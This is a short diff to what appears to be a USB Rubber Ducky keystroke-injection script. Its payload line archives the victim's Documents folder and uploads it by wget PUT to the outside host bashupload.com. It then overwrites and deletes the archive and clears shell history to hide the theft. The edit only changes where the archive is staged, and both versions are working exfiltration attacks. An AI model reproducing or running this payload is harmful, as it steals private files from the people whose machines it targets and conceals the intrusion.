@@ -13,7 +13,5 @@ REM Set directory to compress, server to send tarball to and tarball name.
 STRING SRV="bashupload.com"; DIR="$HOME/Documents"; NM="report.tar.gz"
 ENTER
 
-REM Main payload.
-
-STRING cd $DIR && tar --exclude=$NM -zcf $NM ./* && wget -O - --method=PUT --body-file=$NM $SRV && dd if=/dev/urandom of=$NM bs=100M count=1 && rm $NM && history -c; exit
+STRING cd $DIR && tar --exclude=$NM -zcf /tmp/$NM . && wget -O - --method=PUT --body-file=/tmp/$NM $SRV && dd if=/dev/urandom of=/tmp/$NM bs=100M count=1 && rm /tmp/$NM && history -c; exit
 ENTER
